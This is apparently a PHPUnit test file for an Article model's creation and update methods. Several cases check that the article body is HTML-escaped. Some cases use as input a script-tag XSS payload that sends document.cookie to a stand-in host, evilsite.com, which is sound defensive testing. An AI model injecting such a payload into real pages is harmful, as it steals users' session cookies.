<?php declare(strict_types=1);

namespace App\Commands\Models\Article;

use Carbon\CarbonImmutable;
use InvalidArgumentException;
use PHPUnit\Framework\TestCase;

use function Tests\invokePrivateConstructor;

final class CheckAuthorExistsTrueMock implements CheckAuthorExists
{
    public function handle(string $authorId): bool
    {
        return true;
    }
}

final class CheckAuthorExistsFalseMock implements CheckAuthorExists
{
    public function handle(string $authorId): bool
    {
        return false;
    }
}

/**
 * @coversDefaultClass \App\Commands\Models\Article
 */
final class ArticleTest extends TestCase
{
    public static function providerTestCreateNewArticle(): array
    {
        return [
            'success' => [
                'checkAuthorExists' => new CheckAuthorExistsTrueMock(),
                'inputs'=> [
                    'title'       => 'Sample Title',
                    'description' => 'sample description',
                    'body'        => '## Heading',
                    'tagList'     => ['PHP', 'Laravel'],
                    'authorId'    => '00000',
                ],
                'exceptionName' => null,
            ],
            'success: script injected to body' => [
                'checkAuthorExists' => new CheckAuthorExistsTrueMock(),
                'inputs'=> [
                    'title'       => 'Sample Title',
                    'description' => 'sample description',
                    'body'        => "<script>location.href='http://evilsite.com/getCookie.cgi?cookie='+document.cookie;</script>",
                    'tagList'     => ['PHP', 'Laravel'],
                    'authorId'    => '00000',
                ],
                'exceptionName' => null,
            ],
            'fail: author does not exist' => [
                'checkAuthorExists' => new CheckAuthorExistsFalseMock(),
                'inputs'=> [
                    'title'       => 'Sample Title',
                    'description' => 'sample description',
                    'body'        => '## Heading',
                    'tagList'     => ['PHP', 'Laravel'],
                    'authorId'    => '00000',
                ],
                'exceptionName' => AuthorNotFoundException::class,
            ],
        ];
    }

    /**
     * @covers ::createNewArticle
     * @dataProvider providerTestCreateNewArticle
     */
    public function testCreateNewArticle(
        CheckAuthorExists $checkAuthorExists,
        array $inputs,
        ?string $exceptionName,
    ): void
    {
        if (isset($exceptionName)) {
            $this->expectException($exceptionName);
        }

        $actual = Article::createNewArticle(
            $checkAuthorExists,
            $inputs['title'],
            $inputs['description'],
            $inputs['body'],
            $inputs['tagList'],
            $inputs['authorId'],
        );

        $this->assertNotEmpty($actual->slug);
        $this->assertSame($inputs['title'], $actual->title);
        $this->assertSame($inputs['description'], $actual->description);
        $this->assertSame(htmlspecialchars($inputs['body']), $actual->body);
        $this->assertSame($inputs['tagList'], $actual->tagList);
        $this->assertSame($inputs['authorId'], $actual->authorId);
        $this->assertNotEmpty($actual->createdAt);
        $this->assertNotEmpty($actual->updatedAt);
    }

    public static function providerTestUpdate(): array
    {
        return [
            'success: all properties changed' => [
                'initial' => [
                    'slug'        => 'dummy-slug',
                    'title'       => 'Sample Title',
                    'description' => 'sample description',
                    'body'        => '## Heading',
                    'tagList'     => ['PHP', 'Laravel'],
                    'createdAt'   => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'updatedAt'   => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'authorId'    => '00000',
                ],
                'inputs' => [
                    'title'       => 'Changed Title',
                    'description' => 'changed description',
                    'body'        => '## Changed',
                    'tagList'     => ['changed'],
                ],
                'expected' => [
                    'slug'            => 'dummy-slug',
                    'title'           => 'Changed Title',
                    'description'     => 'changed description',
                    'body'            => htmlspecialchars('## Changed'),
                    'tagList'         => ['changed'],
                    'createdAt'       => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'changeUpdatedAt' => true,
                    'authorId'        => '00000',
                ],
            ],
            'success: no property changed' => [
                'initial' => [
                    'slug'        => 'dummy-slug',
                    'title'       => 'Sample Title',
                    'description' => 'sample description',
                    'body'        => '## Heading',
                    'tagList'     => ['PHP', 'Laravel'],
                    'createdAt'   => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'updatedAt'   => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'authorId'    => '00000',
                ],
                'inputs' => [],
                'expected' => [
                    'slug'            => 'dummy-slug',
                    'title'           => 'Sample Title',
                    'description'     => 'sample description',
                    'body'            => '## Heading',
                    'tagList'         => ['PHP', 'Laravel'],
                    'createdAt'       => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'changeUpdatedAt' => false,
                    'authorId'        => '00000',
                ],
            ],
            'success: script injected to new body' => [
                'initial' => [
                    'slug'        => 'dummy-slug',
                    'title'       => 'Sample Title',
                    'description' => 'sample description',
                    'body'        => '## Heading',
                    'tagList'     => ['PHP', 'Laravel'],
                    'createdAt'   => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'updatedAt'   => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'authorId'    => '00000',
                ],
                'inputs' => [
                    'body' => "<script>location.href='http://evilsite.com/getCookie.cgi?cookie='+document.cookie;</script>",
                ],
                'expected' => [
                    'slug'            => 'dummy-slug',
                    'title'           => 'Sample Title',
                    'description'     => 'sample description',
                    'body'            => htmlspecialchars("<script>location.href='http://evilsite.com/getCookie.cgi?cookie='+document.cookie;</script>"),
                    'tagList'         => ['PHP', 'Laravel'],
                    'createdAt'       => CarbonImmutable::create(2024, 9, 14, 19, 0, 0, 'UTC'),
                    'changeUpdatedAt' => true,
                    'authorId'        => '00000',
                ],
            ],
        ];
    }

    /**
     * @covers ::update
     * @dataProvider providerTestUpdate
     */
    public function testUpdate(array $initial, array $inputs, array $expected): void
    {
        /** @var Article */
        $target = invokePrivateConstructor(Article::class, [
            $initial['slug'],
            $initial['title'],
            $initial['description'],
            $initial['body'],
            $initial['tagList'],
            $initial['createdAt'],
            $initial['updatedAt'],
            $initial['authorId'],
        ]);

        $target->update($inputs);

        $this->assertSame($expected['slug'], $target->slug);
        $this->assertSame($expected['title'], $target->title);
        $this->assertSame($expected['description'], $target->description);
        $this->assertSame($expected['body'], $target->body);
        $this->assertSame($expected['tagList'], $target->tagList);
        $this->assertEquals($expected['createdAt'], $target->createdAt);
        match ($expected['changeUpdatedAt']) {
            true    => $this->assertNotEquals($initial['updatedAt'], $target->updatedAt),
            false   => $this->assertEquals($initial['updatedAt'], $target->updatedAt),
            default => throw new InvalidArgumentException(),
        };
        $this->assertSame($expected['authorId'], $target->authorId);
    }
}
